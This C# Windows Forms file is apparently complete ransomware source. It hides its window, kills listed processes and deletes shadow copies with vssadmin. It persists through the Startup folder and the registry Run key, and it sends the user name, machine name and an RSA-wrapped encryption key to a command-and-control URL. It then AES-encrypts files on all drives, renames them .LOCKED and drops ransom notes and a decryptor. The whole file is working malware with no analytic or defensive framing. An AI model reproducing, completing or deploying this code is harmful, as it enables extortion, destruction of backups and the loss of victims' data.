using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Collections;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Net;
using System.Collections.Specialized;
using System.Threading;



namespace Main
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            startAction();
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        static byte[] passwordBytes;
        static List<string> crypted = new List<string>();

        void startAction()
        {

            string password = createPassword(Settables.PASSLENGTH);
            Post(password);

            Proc();
            Shd();


            string thisPath = Assembly.GetEntryAssembly().Location;
            byte[] thisExe = File.ReadAllBytes(thisPath);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\servicesmc", thisExe);
            addToStartupRegistry("Service", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\servicesmc.exe");


            if (!string.IsNullOrEmpty(Settables.CONTAINMENTPATH))
            {
                encryptDirectory(Settables.CONTAINMENTPATH);
            }
            else
            {
                var sensitiveDirs = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
                };

                foreach (string str in sensitiveDirs)
                {
                    encryptDirectory(str);
                }

                string[] drives = System.IO.Directory.GetLogicalDrives();
                foreach (string str in drives)
                {
                    encryptDirectory(str);
                }



              dropFiles();
              Wallpaper.Set(Settables.LOGURL + "YOUR_IMAGE", Wallpaper.Style.Stretched);

              password = null;
              passwordBytes = null;
          }
            System.Windows.Forms.Application.Exit();
        }

        public void Post(string msg)
        {
          try
          {
            using (var client = new WebClient())
            {
                string url = Settables.LOGURL + "PAGE_TO_POST";
                byte[] response =
                client.UploadValues(url, new NameValueCollection()
                {
                   { "user_name", Environment.UserName },
                   { "computer_name", Environment.MachineName },
                   { "password", msg }
                });

                var responseString = Encoding.UTF8.GetString(response);
            }
          }
          catch (Exception e)
          {
            if (e.Data != null)
            {
              Environment.Exit(0);

            }
          }
        }

        static string createPassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            string s = "";
            using (RNGCryptoServiceProvider provider = new RNGCryptoServiceProvider())
            {
                while (s.Length != length)
                {
                    byte[] oneByte = new byte[1];
                    provider.GetBytes(oneByte);
                    char character = (char)oneByte[0];
                    if (valid.Contains(character))
                    {
                        s += character;
                    }
                }
            }

            //passwordBytes becomes updated so encryption can work
            passwordBytes = Encoding.UTF8.GetBytes(s);
            passwordBytes = SHA512.Create().ComputeHash(passwordBytes);

            //encrypt s with rsa and send via post to CC
            var key = getEmbeddedResource("Main.Embedded.pubkey.txt");
            string pKey = Encoding.UTF8.GetString(key);
            var sr = new System.IO.StringReader(pKey);
            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));
            var pubKey = (RSAParameters)xs.Deserialize(sr);

            var csp = new RSACryptoServiceProvider();
            csp.ImportParameters(pubKey);

            var bytesS = Encoding.UTF8.GetBytes(s);
            var ciph = csp.Encrypt(bytesS, false);
            var textCiph = Convert.ToBase64String(ciph);

            return textCiph;


        }

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Wow64DisableWow64FsRedirection(out IntPtr OldValue);

        private void Shd()
        {
          try
          {
            Process cmd = new Process();
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.FileName = "cmd";
            bool bWow64 = false;
            IsWow64Process(Process.GetCurrentProcess().Handle, out bWow64);
            if (bWow64)
            {
                IntPtr OldValue = IntPtr.Zero;
                bool bRet = Wow64DisableWow64FsRedirection(out OldValue);
            }
            cmd.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            cmd.StartInfo.Arguments = @"/C vssadmin Delete Shadows /All /Quiet";
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
          }

          catch
          {
            //continue;
          }
        }


        private bool Proc()
        {
          try
          {
            Process[] prc = Process.GetProcesses();
            string[] prcKill = Settables.PROCLIST;
            for (int i = 0; i < prc.Length; i++)
            {
              for (int j = 0; j < prcKill.Length; j++)
              {
                if (prc[i].ProcessName == prcKill[j])
                {
                  prc[i].Kill();
                }
              }
            }
          }
          catch (Exception ex)
          {
            if (ex.Data != null)
            {
              return false;
            }
          }
          return true;
        }

        void encryptDirectory(string location)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (Settables.EXTENTIONS.Contains(extension.ToLower()))
                    {
                        encryptFile(files[i]);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i]);
                }
            }
            catch { }
        }

        void encryptFile(string file)
        {
            try
            {
                try
                {
                    if (Settables.Mode == ExecutionMode.Full)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                    else if (new FileInfo(file).Length <= 4096)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                    else
                    {
                        byte[] buff = new byte[8192];
                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
                        {
                            byte[] bb = encryptAES(reader.ReadBytes(4096), passwordBytes);
                            Array.Copy(bb, buff, bb.Length);
                        }
                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
                        {
                            writer.Write(buff);
                        }
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                }
                catch (Exception ex)
                {
                    FileAttributes attributes = File.GetAttributes(file);
                    if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
                        File.SetAttributes(file, attributes);
                    }

                    if (Settables.Mode == ExecutionMode.Full)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                    else if (new FileInfo(file).Length <= 4096)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                    else
                    {
                        byte[] buff = new byte[8192];
                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
                        {
                            buff = encryptAES(reader.ReadBytes(4096), passwordBytes);
                        }
                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
                        {
                            writer.Write(buff);
                        }
                        System.IO.File.Move(file, file + ".LOCKED");
                        crypted.Add(file);
                    }
                }
            }
            catch { }
        }

        byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] totalBytes = null;
            List<byte []> totalBytesList = new List<byte []>();

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.GenerateIV();
                    var salt = Settables.SALT;
                    var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();

                    totalBytesList.Add(encryptedBytes);
                    totalBytesList.Add(AES.IV);
                    totalBytesList.Add(salt);


                }
            }
            totalBytes = totalBytesList
              .SelectMany(a => a)
              .ToArray();

            return totalBytes;
        }


        void dropFiles()
        {
            if (crypted.Count < 1) return;

            byte[] decryptorBuffer = getEmbeddedResource("Main.Embedded.Decrypt.exe");
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\Decryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Decryptor.exe", decryptorBuffer);

            byte[] messageBuffer = getEmbeddedResource("Main.Embedded.Message.exe");
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe", messageBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe", messageBuffer);

            addToStartupRegistry("Message", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
            startProcess(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");

            byte[] RansomNote = Encoding.UTF8.GetBytes(Settables.RANSOM_NOTE);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\RANSOM_NOTE.txt", RansomNote);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\RANSOM_NOTE.txt", RansomNote);
        }


        static void dropFile(string path, byte[] buffer)
        {
            try
            {
                if (!File.Exists(path))
                {
                    File.WriteAllBytes(path, buffer);
                }
            }
            catch { }
        }
        static byte[] getEmbeddedResource(string fullName)
        {
            byte[] decryptorBuffer = default(byte[]);
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fullName);
            using (var memstream = new MemoryStream())
            {
                stream.CopyTo(memstream);
                decryptorBuffer = memstream.ToArray();
            }
            return decryptorBuffer;
        }
        static void addToStartupRegistry(string name, string path)
        {
            try
            {
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue(name, "\"" + path + "\"");
            }
            catch { }
        }
        static void startProcess(string path)
        {
            try
            {
                Process.Start(path);
            }
            catch { }
        }
        static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
        {
            return attributes & ~attributesToRemove;
        }
    }
}
